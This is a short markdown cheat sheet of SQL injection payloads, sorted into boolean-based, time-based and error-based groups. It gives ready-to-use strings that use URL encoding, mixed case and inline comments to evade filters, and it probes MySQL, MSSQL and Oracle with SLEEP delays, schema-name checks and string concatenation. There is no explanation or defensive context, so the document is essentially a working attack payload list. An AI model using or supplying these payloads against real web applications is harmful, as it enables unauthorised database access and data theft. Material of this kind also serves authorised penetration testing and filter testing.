`boolean based`
```
AND+(SELECT+1+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+SCHEMA_NAME+LIKE+'a%')%3d1
```
`time based`
```
bug4y0u'+AND+/**/(%53ELEcT+1+/**/+fRoM/**/+(SE%4cEC%54(sL%45%45P(3%29%29%29a)+A%4ed+'bug4y0u'%3d'bug4y0u
bug4y0u'|(IF((now())LIKE(sysdate()),SLEEP(6),0))|'bug4y0u
?id=708'+ANd+E%4cT/**/(1337%3d1337,/**/sL%45EP%283*4)/**//**//**/)+OR+/**/'1337'%3d'bug4y0u
```
`error based`
```
' || (select '') || '        -->(MySQL/MSSQL)
' || (select 1+2 from dual) || '        -->(Oracle)
```
